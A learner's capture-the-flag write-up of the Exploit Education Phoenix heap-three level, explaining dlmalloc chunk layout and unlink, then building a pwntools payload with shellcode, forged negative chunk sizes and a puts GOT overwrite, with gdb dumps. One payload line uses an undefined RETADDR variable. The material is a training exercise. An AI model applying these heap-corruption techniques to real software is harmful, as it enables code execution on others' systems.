# Exploit-Education Phoenix Heap Three

Source: http://exploit.education/phoenix/heap-three/ 
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

void winner() {
  printf("Level was successfully completed at @ %ld seconds past the Epoch\n",
      time(NULL));
}

int main(int argc, char **argv) {
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

### Solve

This was the first heap challenge that required learning a lot about the heap, so it's gonna be my first write-up I do to put on a website. I need to rite this stuff down or I'm gonna forget it all.

Looking at the source code, the first thing we can see is the fact that we have an overflow, so we can overflow the malloc chunks. Is this useful? Idk we'll see. Other thna that there isn't anything obvious. Since our write only happens before the frees and the printf, we have to somehow get a code redirection with just `free()` and `printf()`.

Initial assumption is that there is some kind of write in the `free()` with which we can overwrite either the `__free_hook` or `printf` in the GOT / PLT. Not totally sure how that would look, but I can figure it out.

Starting out, we need to get familiar with the malloc source code (the challenge hints that the glibc library used is [2.7.2](https://elixir.bootlin.com/glibc/glibc-2.7/source/malloc/malloc.c), and they gave us a different link to the [dlmalloc source](gee.cs.oswego.edu/pub/misc/malloc-2.7.2.c), but I'm a fan of the elixir site.

When a call to malloc is made, the piece of the heap used to fulfil that request isn't limited to just the data you give it. In the [source](https://elixir.bootlin.com/glibc/glibc-2.7/source/malloc/malloc.c#L1773), the struct for `malloc_chunk` is defined as such:
```c
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```
The struct for malloc starts with two integer values stored in a word (this is dynamicallly determined based on the system). Then, two words are reserved for pointers, and the next two are used for larger blocks. So as a grand total, no malloc block can be smaller than 4 words. 

Testing this out, we have a program as follows, and run it in gdb:
```c
#include <stdlib.h>

int main() {
        void *a = malloc(1);
        free(a);
}
```
When this runs, and malloc is called, we can run `vmmap` to get our heap address, then `x/10gx <address>` to see the state of the heap:
```
0x555555756000: 0x0000000000000000      0x0000000000000021
0x555555756010: 0x0000000000000000      0x0000000000000000
0x555555756020: 0x0000000000000000      0x0000000000020fe1
0x555555756030: 0x0000000000000000      0x0000000000000000
0x555555756040: 0x0000000000000000      0x0000000000000000
```

Our first chunk starts here, and the very first word we see is reserved for the `prev_size`, which is only used if the chunk before it is not in use. The next word contains the size of our chunk, which we'll talk about later. Then we have our two words of space dedicated to the pointers it will later use. Then, at the offset 0x555555756020, we have what is called the "top chunk". This chunk is just blank space and is taken from to form new chunks. It has a `prev-size` field (which is 0), and its size field is the size of the rest of the heap: `0x20fe1`. So why is the size marked as `0x21` when our heap chunk only has `0x20` bytes??? Turns out heap sizes are interesting and we have some reserved bits to worry about.

Back at the [`malloc_chunk` declaration](https://elixir.bootlin.com/glibc/glibc-2.7/source/malloc/malloc.c#L1773), we have a description of what the chunk contains. It comes with a neat little piece of ascii art that you get to enjoy now:
```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if allocated            | |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                       |M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk                                     |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Notice the M and the P? Those are our reserved bits (in 2.7.2 anyways, there's a third bit added in later versions). The M stands for `IS_MMAPED`, and isn't relevant to us right now. The `P`, on the other hand, is why our value is `0x21` instead of `0x20`. `PREV_INUSE` denotes whether or not the previous chunk is being used. If the `PREV_INUSE` bit is set, the `prev_size` will also be set, and vice versa. The first chunk of the heap will always have its `PREV_INUSE` bit set, since there is, effectively, a chunk before it that cannot be touched.

Now we move to what happens in a `free()`, as this will be significantly more important to us for this exploit. Looking at the [`free()` source](https://elixir.bootlin.com/glibc/glibc-2.7/source/malloc/malloc.c#L4530), we can see a couple things. First, we have some security checks, then an `if` statement that will branch execution based on the size of the chunks.
```c
if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
```

So one branch follows if it's before whatever that is referring to, and the other happens if that's not the case. I'll save you some time:
```c
/* The maximum fastbin request size we support */
#define MAX_FAST_SIZE     80
```

`malloc` handles `free` differently if it's going into a fastbin than if it's going into the unsorted bin. Those are useful to know about, but outside the actual scope of this exploit. Just know that there is a maximum size that is handled by the fastbins, and as it turns out, we want to make sure our chunk is bigger than that because that code calls a fun function called `unlink`, which is where the exploit is based.

We have some double free and size checks at the beginning of the [next branch](https://elixir.bootlin.com/glibc/glibc-2.7/source/malloc/malloc.c#L4613), and we just need to be a little careful and we can avoid messing with those. Then we consolidate backwards and consolidate forwards, in that order. Heap chunk consolidation is the process by which the heap handles freed memory. When you free a chunk, it goes into one of the bins for temporary storage (fastbin, tcache, unsorted, etc). Then, whenever it can, the heap will consolidate neighboring chunks into larger chunks so they can be reused more readily (since a chunk of the smallest size may not be required all that often). When it does this, it "unlink"s them so that their `prev` and `next` pointers are leading to the right locations.

Here's what the [source code](https://elixir.bootlin.com/glibc/glibc-2.7/source/malloc/malloc.c#L4649) does to consolidate backwards:
```c
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(p, bck, fwd);
    }
```

We move to the chunk before and unlink it. Pretty simple right? [Unlink](https://elixir.bootlin.com/glibc/glibc-2.7/source/malloc/malloc.c#L2076) is also pretty simple. It has more code and checks, but all it really does is this:
```c
#define unlink(P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;
    BK->fd = FD;
}
```

It just gives the previous block its forward pointer and gives the next block it's prev pointer. Simple enough. Since we have an overwrite, what if we could control what was being pointed to? If we could trick `free()` into thinking the block was already free, it would be as simple as forging those pointers and we get arbitrary swapping of memory. In the specific machine [Exploit Education](http://exploit.education/phoenix/) gives you, ASLR is turned off, as well, so we can actually know addresses on the heap and the stack. Since we can write to the heap and we can know where it's written, that arbitrary swap turns into arbitrary write and we have a PoC. Let's put it into action.

Specifically, I'll be working with the `/opt/phoenix/i486/heap-three` binary, since 32-bit is a little bit easier to swallow.

Starting off looking at GDB, let's confirm some of our theories. We break on `malloc`, `free`, and `strcpy`, run the binary, and continue until the first `malloc` call runs. At this point, the heap has been initialized, and we can start looking at its memory.

Running `vmmap` gives us this output:
```
(gdb) vmmap
Start      End        Offset     Perm Path
0x08048000 0x0804c000 0x00000000 r-x /opt/phoenix/i486/heap-three
0x0804c000 0x0804d000 0x00003000 rwx /opt/phoenix/i486/heap-three
0xf7e69000 0xf7f69000 0x00000000 rwx 
0xf7f69000 0xf7f6b000 0x00000000 r-- [vvar]
0xf7f6b000 0xf7f6d000 0x00000000 r-x [vdso]
0xf7f6d000 0xf7ffa000 0x00000000 r-x /opt/phoenix/i486-linux-musl/lib/libc.so
0xf7ffa000 0xf7ffb000 0x0008c000 r-x /opt/phoenix/i486-linux-musl/lib/libc.so
0xf7ffb000 0xf7ffc000 0x0008d000 rwx /opt/phoenix/i486-linux-musl/lib/libc.so
0xf7ffc000 0xf7ffe000 0x00000000 rwx 
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
```

Sometimes one of these sections will be labelled `[heap]`, which makes it really easy, but if not the heap will be one of the sections towards the top, it won't have a path, and it'll have `rwx` permissions. In our case, it's that third entry: 0xf7e69000. Run `memory watch 0xf7e69000 20 qword`, and we'll get some visibility into the heap every time we hit a breakpoint or step.

Once we've got that set up, let's just continue until we can see our heap form, be written to, and free. First, we can see the newly formed heap, exactly as expected:
```
0xf7e69000│+0x0000 0x0000002900000000
0xf7e69008│+0x0008 0x0000000000000000
0xf7e69010│+0x0010 0x0000000000000000
0xf7e69018│+0x0018 0x0000000000000000
0xf7e69020│+0x0020 0x0000000000000000
0xf7e69028│+0x0028 0x0000002900000000
0xf7e69030│+0x0030 0x0000000000000000
0xf7e69038│+0x0038 0x0000000000000000
0xf7e69040│+0x0040 0x0000000000000000
0xf7e69048│+0x0048 0x0000000000000000
0xf7e69050│+0x0050 0x0000002900000000
0xf7e69058│+0x0058 0x0000000000000000
0xf7e69060│+0x0060 0x0000000000000000
0xf7e69068│+0x0068 0x0000000000000000
0xf7e69070│+0x0070 0x0000000000000000
0xf7e69078│+0x0078 0x000fff8900000000
```

Next, I wrote A's, B's, and C's so it was clear which piece went where. This also went as expected, and here is our heap written to:
```
0xf7e69000│+0x0000 0x0000002900000000
0xf7e69008│+0x0008 0x4141414141414141
0xf7e69010│+0x0010 0x0000000000000000
0xf7e69018│+0x0018 0x0000000000000000
0xf7e69020│+0x0020 0x0000000000000000
0xf7e69028│+0x0028 0x0000002900000000
0xf7e69030│+0x0030 0x4242424242424242
0xf7e69038│+0x0038 0x0000000000000000
0xf7e69040│+0x0040 0x0000000000000000
0xf7e69048│+0x0048 0x0000000000000000
0xf7e69050│+0x0050 0x0000002900000000
0xf7e69058│+0x0058 0x4343434343434343
0xf7e69060│+0x0060 0x0000000000000043
0xf7e69068│+0x0068 0x0000000000000000
0xf7e69070│+0x0070 0x0000000000000000
0xf7e69078│+0x0078 0x000fff8900000000
```

After our first free, this is the state:
```
0xf7e69000│+0x0000 0x0000002900000000
0xf7e69008│+0x0008 0x4141414141414141
0xf7e69010│+0x0010 0x0000000000000000
0xf7e69018│+0x0018 0x0000000000000000
0xf7e69020│+0x0020 0x0000000000000000
0xf7e69028│+0x0028 0x0000002900000000
0xf7e69030│+0x0030 0x4242424242424242
0xf7e69038│+0x0038 0x0000000000000000
0xf7e69040│+0x0040 0x0000000000000000
0xf7e69048│+0x0048 0x0000000000000000
0xf7e69050│+0x0050 0x0000002900000000
0xf7e69058│+0x0058 0x4343434300000000
0xf7e69060│+0x0060 0x0000000000000043
0xf7e69068│+0x0068 0x0000000000000000
0xf7e69070│+0x0070 0x0000000000000000
0xf7e69078│+0x0078 0x000fff8900000000
```

This behavior initially confused me. It becomes clear why, though, when we remember that what we learned doesn't apply to anything smaller than 80 bytes. These chunks are being sent into the [fastbins](https://elixir.bootlin.com/glibc/glibc-2.7/source/malloc/malloc.c#L4573). The fast bins contain singly-linked lists, so as we see in the source code for free, it takes the `->fd` pointer and sets it to the value of `*fb`, which starts as null. After that, it sets `*fb` to equal the address of our current chunk. If that's what's happening, when we continue, we should see our chunk A's value appear in chunk B
```
0xf7e69000│+0x0000 0x0000002900000000
0xf7e69008│+0x0008 0x4141414141414141
0xf7e69010│+0x0010 0x0000000000000000
0xf7e69018│+0x0018 0x0000000000000000
0xf7e69020│+0x0020 0x0000000000000000
0xf7e69028│+0x0028 0x0000002900000000
0xf7e69030│+0x0030 0x42424242f7e69050
0xf7e69038│+0x0038 0x0000000000000000
0xf7e69040│+0x0040 0x0000000000000000
0xf7e69048│+0x0048 0x0000000000000000
0xf7e69050│+0x0050 0x0000002900000000
0xf7e69058│+0x0058 0x4343434300000000
0xf7e69060│+0x0060 0x0000000000000043
0xf7e69068│+0x0068 0x0000000000000000
0xf7e69070│+0x0070 0x0000000000000000
0xf7e69078│+0x0078 0x000fff8900000000
```

As expected, `->fd` of chunk B is now equal to the address of chunk A. This is the same for the third chunk. Let's start writing an exploit. What we'd like to do is a) trick `free` into thinking that our chunk C is already freed and that it needs to be consolidated, and make a swap between some memory in our heap space to the GOT. We can overwrite puts, because it is called at the end of the binary. I initially thought this meant overwriting the PLT, but then I realized that the PLT holds code that calls whatever address is stored in the GOT. So if we can insert the address of winner into the binary in the GOT for puts, we can get it to run it.

Initally I had the idea of swapping the two addresses, but both locations have to be writeable or it would crash, so that got scrapped. Instead, we can put shellcode in the heap that will run our exploit for us.

```python
from pwn import *

PUTS = 0x804c13c # address of puts@GOT
WINNER = 0x080487d5 # address of winner
HEAPADDR = 0xf7e69000 # address of the start of the heap
```

Those are the addresses we need. The first chunk of our script needs to be our shellcode, since it's the easiest to access:

```python
shellcode = b"\x68\xD5\x87\x04\x08\xC3"

payload = b'\x90'*12 + shellcode # set up the shellcode
payload += b' '
```

The shellcode I [compiled online](https://defuse.ca/online-x86-assembler.htm), and it literally just pushes the address of winner and returns. If you wanted to see it, here it is:

```assembly
push 0x080487d5
ret
```

Pretty simple. I added nops just in case, as it's habit at this point from stack exploitation. I've also got plenty of bytes to work with so this shouldn't be a problem. (It actually is a problem, and you're smarter than I am if you can tell why already). The space is because I'm printing it to be used as command line arguments. Next chunk we need to overwrite the size pointers of our last chunk. We can overwrite the `prev_size` and `size`, first of all to unset the `PREV_INUSE` bit, and then to set the size to something we can use. Since it unlinks the previous chunk instead of our own, this proves trick and is where our writes are important.

For the size values, I got the ideas from [Vudo Malloc Tricks](http://phrack.org/issues/57/8.html) from the old Phrack magazine (great read, would recommend). In the article, they suggest using really large values for our size because of the way `malloc` works with size values. 

Here's the code we care about in `free()`:
```c
if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(p, bck, fwd);
    }
```
To determine the last chunk, it uses the `chunk_at_offset` function. It also uses this for determining where the last chunk is in the first place. So we need that function definition, too.

```c
/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr)(((char*)(p)) + (s)))
```

It just adds them together. For anyone who knows how numbers work in C, this function should seem fishy at best. Using a really large size pointer is great for 2 reasons. First of all, it allows us to not have the chunk handled by the fastbins. Second, because the addition is unchecked, we can overflow and use those really big numbers to act as negative numbers. Here's what I mean:

Assume we use the value 0xfffffffc (and we will). When we're adding that to our pointer, which let's assume is 0x4008, 0xfffffffc + 0x4008 = 0x100004004. Since it's working with 32-bit numbers, that leading one gets truncated and we end up with a result of 0x4004, which means our 0xfffffffc is just -4. Now let's craft our sizes.

Firstly, we want our forward chunk to be valid and not the top chunk. It will break if it's invalid, and I'm not sure what the behavior would be if it was the top chunk, but best not to test it out for our exploit (I'll figure it out later and maybe I'll add it to the writeup). Since we can use negative numbers, we can just pretend like chunk a is the next chunk? So use the value 0xffffffb0 to equal -80? Then our `prev_size` can be -4.

```python
payload += b'A'*32 + p32(0xfffffffc) + p32(0xffffffb0)
```

This means when our chunk is freed, it will think the current chunk is free already and try to consolidate it (since `PREV_INUSE` is unset). It'll check next and realize that chunk is in use and ignore it. Next it'll step back to the last chunk using `prev_size`, and consolidate that chunk. Because of the way `free()` calculates that value (`p = chunk_at_offset(p, -((long) prevsize));`), it will use -(`prevsize`), which in our case == `-(-4)` == `4`. So it will add 4 to our current p and unlink that. This means we just need an extra 4 bytes of padding.

Obviously we're going to use the values we defined at the beginning of the file, but we need to do some offsetting of those to make this work as intended. It swaps `p->fd` with `p->bk->fd`, and then `p->bk` with `p->fd->bk`. Since structs in C are just defined by an offset, `->bk` is adding 12 to our pointer address, and `->fd` is adding 8. So if we are going to put our address to write to first, if we want it to write to the correct address, we need to put -12, so it ends up finding the right address. The second address needs to be the pointer to our executable heap write so that it will end up in our GOT location. Let's write that out:
```python
payload += b'A' * 4 + p32(PUTS-12) + p32(RETADDR+16)
```

If we just tack on `print(str(payload)[2:-1])`, it will print it as raw bytes to the terminal, which we'll put into a file: `echo -ne $(python3 solve-heap-three.py) > payload`. Then we can then run with `/opt/phoenix/i486/heap-three $(cat payload)`.

Segmentation fault.... hmmm.... let's check out our free's in gdb.

```
 → 0xf7e6902b                  add    BYTE PTR [ecx], ch
   0xf7e6902d                  add    BYTE PTR [eax], al
   0xf7e6902f                  add    BYTE PTR [eax], al
   0xf7e69031                  add    BYTE PTR [eax], al
   0xf7e69033                  add    BYTE PTR [ecx+0x41], al
   0xf7e69036                  inc    ecx
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── memory:0xf7e69000 ────
0xf7e69000│+0x0000 0x00000028ffffffac
0xf7e69008│+0x0008 0x90909090f7e69028
0xf7e69010│+0x0010 0x0487d56890909090
0xf7e69018│+0x0018 0x000000000804c130
0xf7e69020│+0x0020 0x0000000000000000
0xf7e69028│+0x0028 0x0000002900000000
0xf7e69030│+0x0030 0x4141414100000000
0xf7e69038│+0x0038 0x4141414141414141
0xf7e69040│+0x0040 0x4141414141414141
0xf7e69048│+0x0048 0x4141414141414141
0xf7e69050│+0x0050 0xffffffb0fffffffc
0xf7e69058│+0x0058 0x0804c1f4ffffffad
0xf7e69060│+0x0060 0x000000000804c1f4
0xf7e69068│+0x0068 0x0000000000000000
0xf7e69070│+0x0070 0x0000000000000000
0xf7e69078│+0x0078 0x000fff8900000000
0xf7e69080│+0x0080 0x0000000000000000
0xf7e69088│+0x0088 0x0000000000000000
0xf7e69090│+0x0090 0x0000000000000000
0xf7e69098│+0x0098 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "heap-three", stopped, reason: SIGSEGV
```

It made it to executing our shell code, but our shell code isn't right... what went wrong? We can see what happened in the fact that our nops are broken up. In writing the exploit I forgot that I would be writing to the address we gave +8... This means that rather than our last couple bytes of shellcode being what we expected, the offset when it starts ends up being overwritten by the address of the GOT!!! All we need to do is reduce the size of the nops and lower our offset from the start of the heap to match. We could go no nops, but I'll leave 4 there for funsies. The heap offset will be reduced from 16 to 12, too.

Now this is what our heap looks like after the first copy:
```
0xf7e69000│+0x0000 0x0000002900000000
0xf7e69008│+0x0008 0x0487d56890909090
0xf7e69010│+0x0010 0x000000000000c308
0xf7e69018│+0x0018 0x0000000000000000
0xf7e69020│+0x0020 0x0000000000000000
0xf7e69028│+0x0028 0x0000002900000000
0xf7e69030│+0x0030 0x4141414141414141
0xf7e69038│+0x0038 0x4141414141414141
0xf7e69040│+0x0040 0x4141414141414141
0xf7e69048│+0x0048 0x4141414141414141
0xf7e69050│+0x0050 0xffffffb0fffffffc
0xf7e69058│+0x0058 0x0804c13041414141
0xf7e69060│+0x0060 0x00000000f7e6900c
0xf7e69068│+0x0068 0x0000000000000000
0xf7e69070│+0x0070 0x0000000000000000
0xf7e69078│+0x0078 0x000fff8900000000
```

Everything is looking promising, we have our addresses in the right places for chunk C, and our shellcode visible in chunk A. We can even see our sizes in chunk C. Let's go to the first free.

```
0xf7e69000│+0x0000 0x00000028ffffffac
0xf7e69008│+0x0008 0x0487d56890909090
0xf7e69010│+0x0010 0x0804c1300000c308
0xf7e69018│+0x0018 0x0000000000000000
0xf7e69020│+0x0020 0x0000000000000000
0xf7e69028│+0x0028 0x0000002900000000
0xf7e69030│+0x0030 0x4141414141414141
0xf7e69038│+0x0038 0x4141414141414141
0xf7e69040│+0x0040 0x4141414141414141
0xf7e69048│+0x0048 0x4141414141414141
0xf7e69050│+0x0050 0xffffffb0fffffffc
0xf7e69058│+0x0058 0x0804c1f4ffffffad
0xf7e69060│+0x0060 0x000000000804c1f4
0xf7e69068│+0x0068 0x0000000000000000
0xf7e69070│+0x0070 0x0000000000000000
0xf7e69078│+0x0078 0x000fff8900000000
```

Various things have changed, but it should still run. First off, our addresses actually did switch around, so we know that worked. Next, our `PREV_INUSE` bit and `prev_size` from chunk A have changed, so we successfully convinced it to think that chunk C is before it. And it once again wrote an address to chunk A, but it's after our shell code, so we're safe! Let's check our GOT, too.

```
0x804c13c <puts@got.plt>:       0xf7e6900c
```

Okay! The got has our heap address!!!! Now we can just continue and win!

```
(gdb) 
Continuing.
Level was successfully completed at @ 1721764352 seconds past the Epoch
[Inferior 1 (process 706) exited normally]
```

It executed!!! Let's try it outside of gdb just to make sure:

```bash
user@phoenix-amd64:~/heap$ /opt/phoenix/i486/heap-three $(cat payload)
Level was successfully completed at @ 1721764387 seconds past the Epoch
```

We got it! I learned a whole ton about the heap doing this challenge, and I'm pretty excited to learn even more as I continue to work on getting better at PWN. If you made it this far, thanks for following along!










